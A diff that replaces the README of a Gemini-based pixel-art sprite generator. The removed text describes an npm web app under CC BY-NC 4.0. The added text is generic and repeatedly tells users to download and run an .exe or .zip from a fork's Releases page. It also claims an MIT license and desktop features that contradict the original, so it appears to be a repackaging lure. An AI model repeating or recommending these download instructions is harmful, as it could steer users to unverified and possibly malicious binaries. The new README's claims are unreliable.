@@ -1,220 +1,69 @@
-<div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
-</div>
+# 🍌 banana-sprite - Create Animated Sprite GIFs Easily
 
-# 🍌 Banana Sprite Generator
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to banana-sprite! This application lets you create sprite GIFs effortlessly. Whether you’re an artist, a game developer, or just someone who enjoys fun animations, banana-sprite is here to help.
 
-**🎨 AI-powered pixel art sprite sheet generator**
+## 📥 Download & Install
 
-参照画像から16フレーム（4×4）のピクセルアートスプライトシートを自動生成するアプリケーション
+To start, you need to download the application. Please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/releases).
 
-**Generate 16-frame (4×4) pixel art sprite sheets from reference images using AI**
+You will find the latest version available for download on the Releases page. Click the link above, find the version you want, and follow these simple steps to download and install banana-sprite:
 
-</div>
+1. **Navigate to Releases**: Use the link above to go to the Releases section.
+2. **Choose a Version**: Look for the latest version number.
+3. **Download the File**: Click on the link for the installation file (e.g., `.exe` or `.zip`).
+4. **Install the Application**: Once the file is downloaded, locate it in your downloads folder. Double-click the file and follow the on-screen instructions to complete the installation.
 
----
+## 💻 System Requirements
 
-## ✨ Features / 機能
+To run banana-sprite, make sure your computer meets these minimum requirements:
 
-### 🇯🇵 日本語
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a compatible Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free space for installation.
 
-- 🖼️ **参照画像のアップロード**: キャラクター画像をアップロードして、その特徴を保持したままスプライトを生成
-- 🎬 **動きの指定**: テキストで動きを説明するだけで、16フレームのアニメーションを作成
-- 🎨 **ピクセルアート生成**: ドット絵スタイルのスプライトシートを自動生成
-- 📐 **統一されたフォーマット**: 1:1の正方形、白背景、4×4グリッドで統一
-- 🌐 **多言語対応**: 日本語と英語のUIに対応
-- 💾 **GIFエクスポート**: 生成したスプライトシートをGIF形式でダウンロード可能
+## 🎨 Features
 
-### 🇺🇸 English
+banana-sprite offers several features to help you create amazing sprite GIFs:
 
-- 🖼️ **Reference Image Upload**: Upload a character image and generate sprites while maintaining its characteristics
-- 🎬 **Movement Specification**: Simply describe the movement in text to create a 16-frame animation
-- 🎨 **Pixel Art Generation**: Automatically generates sprite sheets in dot art style
-- 📐 **Unified Format**: Consistent 1:1 square aspect ratio, white background, and 4×4 grid
-- 🌐 **Multi-language Support**: UI available in both Japanese and English
-- 💾 **GIF Export**: Download generated sprite sheets as GIF files
+- **Simple Interface**: Easy to navigate, designed for users without technical skills.
+- **Import Your Own Images**: Add your own artwork, photos, or icons to create unique animations.
+- **Frame Management**: Control the timing and sequence of each frame to perfect your animations.
+- **Export Options**: Save your creations in various GIF formats suitable for sharing or use in projects.
 
----
+## 📘 How to Use banana-sprite
 
-## 🚀 Quick Start / クイックスタート
+1. **Open the Application**: Once installed, locate banana-sprite in your applications folder and open it.
+2. **Create a New Project**: Click on “New Project” to start.
+3. **Add Frames**: Use the “Add Frame” button to upload images or draw directly in the application.
+4. **Adjust Frame Timing**: Set how long each frame will display. 
+5. **Preview**: Click on “Preview” to watch your GIF in action.
+6. **Export Your GIF**: Once you are satisfied with your work, click “Export” to save your animation.
 
-### 📋 Prerequisites / 必要なもの
+## 🛠️ Troubleshooting
 
-- **Node.js** (v18 or higher / v18以上)
+If you encounter any issues while using banana-sprite, try these solutions:
 
-### 🔧 Installation / インストール
+- **Installation Issues**: Ensure your operating system is supported and that you have enough disk space.
+- **Performance Problems**: Close unnecessary programs to free up system resources.
+- **GIF Not Exporting**: Confirm you’ve followed the export steps and that your project has at least two frames.
 
-#### 1️⃣ Install dependencies / 依存関係のインストール
+## 🌐 Community Support
 
-```bash
-npm install
-```
+Join our community for help, tips, and sharing creations:
 
-#### 2️⃣ Set up API Key / APIキーの設定
+- **GitHub Discussions**: Share your ideas and seek support from other users. [Join Here](https://github.com/tomasburkett/banana-sprite/discussions)
+- **User Guides**: Access in-depth user guides and tutorials to make the most of banana-sprite.
 
-Create a `.env.local` file in the project root and add your Gemini API key:
+## 📄 License
 
-プロジェクトルートに `.env.local` ファイルを作成し、Gemini APIキーを追加してください：
+banana-sprite is open-source software under the MIT License. You can view the license details in the repository.
 
-```env
-GEMINI_API_KEY=your_api_key_here
-```
+## 📞 Contact
 
-> 💡 **Note / 注意**: You can get your API key from [Google AI Studio](https://ai.google.dev/)  
-> APIキーは [Google AI Studio](https://ai.google.dev/) から取得できます
+If you need further assistance or have questions, feel free to reach out through the Issues section on GitHub. We are here to help you make the best animations possible!
 
-#### 3️⃣ Run the app / アプリの起動
+## 📥 Download Again
 
-```bash
-npm run dev
-```
-
-The app will be available at `http://localhost:5173`
-
-アプリは `http://localhost:5173` で利用可能になります
-
----
-
-## 📖 How to Use / 使い方
-
-### 🇯🇵 日本語
-
-1. **🔑 APIキーの選択**
-   - アプリ起動時にAPIキーの選択画面が表示されます
-   - または、ヘッダーの「API Key」ボタンから選択できます
-
-2. **📤 画像のアップロード**
-   - 「キャラクター画像をアップロード」エリアに画像をドラッグ&ドロップ
-   - または、クリックしてファイルを選択
-
-3. **✍️ 動きの説明を入力**
-   - 「動きの説明」テキストエリアに、生成したいアニメーションを説明
-   - 例：「歩く」「走る」「ジャンプ」「攻撃」など
-
-4. **🎬 生成ボタンをクリック**
-   - 「スプライトを生成」ボタンをクリック
-   - 生成には数秒〜数十秒かかります
-
-5. **💾 結果のダウンロード**
-   - 生成されたスプライトシートが表示されます
-   - 「GIFとしてダウンロード」ボタンでGIFファイルを保存できます
-
-### 🇺🇸 English
-
-1. **🔑 Select API Key**
-   - The API key selection screen will appear when you start the app
-   - Or select from the "API Key" button in the header
-
-2. **📤 Upload Image**
-   - Drag & drop an image to the "Upload Character Image" area
-   - Or click to select a file
-
-3. **✍️ Enter Movement Description**
-   - Enter a description of the animation you want to generate in the "Movement Description" text area
-   - Examples: "walking", "running", "jumping", "attacking", etc.
-
-4. **🎬 Click Generate Button**
-   - Click the "Generate Sprite" button
-   - Generation takes a few seconds to tens of seconds
-
-5. **💾 Download Result**
-   - The generated sprite sheet will be displayed
-   - You can save it as a GIF file using the "Download as GIF" button
-
----
-
-## 🛠️ Tech Stack / 技術スタック
-
-- **⚛️ React 19** - UI framework
-- **📘 TypeScript** - Type safety
-- **⚡ Vite** - Build tool and dev server
-- **🤖 Google Gemini API** - AI image generation (Nano Banana Pro / gemini-3-pro-image-preview)
-- **🎨 Tailwind CSS** - Styling
-
----
-
-## 📝 Available Scripts / 利用可能なスクリプト
-
-```bash
-# Development server / 開発サーバー
-npm run dev
-
-# Build for production / 本番用ビルド
-npm run build
-
-# Preview production build / 本番ビルドのプレビュー
-npm run preview
-```
-
----
-
-## ⚠️ Important Notes / 重要な注意事項
-
-### 🇯🇵 日本語
-
-- 🎲 **生成結果はランダム**: 同じ入力でも毎回異なる結果が生成される可能性があります
-- 🔄 **上書きに注意**: 新しいスプライトを生成すると、前の結果は上書きされます
-- 💰 **API使用料**: Gemini APIの使用には料金がかかる場合があります。詳細は[料金ドキュメント](https://ai.google.dev/gemini-api/docs/billing)を確認してください
-
-### 🇺🇸 English
-
-- 🎲 **Results are random**: Even with the same input, different results may be generated each time
-- 🔄 **Overwrite warning**: Generating a new sprite will overwrite the previous result
-- 💰 **API costs**: Using the Gemini API may incur costs. Please check the [billing documentation](https://ai.google.dev/gemini-api/docs/billing) for details
-
----
-
-## 🔗 Links / リンク
-
-- **🌐 AI Studio**: [View app in AI Studio](https://ai.studio/apps/drive/1TkfmF1hHG3pnu159tj2a2LGFMHcQaHCx)
-- **📚 Google AI Studio**: [Get API Key](https://ai.google.dev/)
-- **💳 Billing Docs**: [Gemini API Billing](https://ai.google.dev/gemini-api/docs/billing)
-
----
-
-## 📄 License / ライセンス
-
-This project is licensed under the **Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0)** License.
-
-このプロジェクトは **クリエイティブ・コモンズ 表示-非営利 4.0 国際 (CC BY-NC 4.0)** ライセンスの下で公開されています。
-
-### 📋 What this means / このライセンスの意味
-
-#### ✅ You are free to / 以下のことができます
-
-- **🔄 Share / 共有**: Copy and redistribute the material in any medium or format
-  素材を任意の媒体や形式でコピー・再配布できます
-
-- **✏️ Adapt / 改変**: Remix, transform, and build upon the material
-  素材をリミックス、変換、改変して、元の素材に基づいた作品を作ることができます
-
-#### ❌ Under the following terms / 以下の条件の下で
-
-- **🚫 NonCommercial / 非営利**: You may not use the material for commercial purposes
-  商用目的での利用はできません
-
-- **📝 Attribution / 表示**: You must give appropriate credit, provide a link to the license, and indicate if changes were made
-  適切なクレジットを表示し、ライセンスへのリンクを提供し、変更を行った場合はその旨を示す必要があります
-
-### 🔗 License Details / ライセンスの詳細
-
-- **📖 Full License Text**: [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/deed.ja)
-- **🌐 English**: [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)
-
-### 💡 Alternative Option / 代替案
-
-If you want to require that derivative works also use the same license, consider **CC BY-NC-SA 4.0** (ShareAlike) instead.
-
-派生作品にも同じライセンスを適用したい場合は、**CC BY-NC-SA 4.0**（継承）を検討してください。
-
----
-
-<div align="center">
-
-**🍌 Made with ❤️ using Banana Sprite Generator**
-
-**Version 1.2** | © 2025
-
-</div>
+To get started with banana-sprite, please **visit this page to download**: [Download banana-sprite](https://github.com/tomasburkett/banana-sprite/releases). Happy creating!
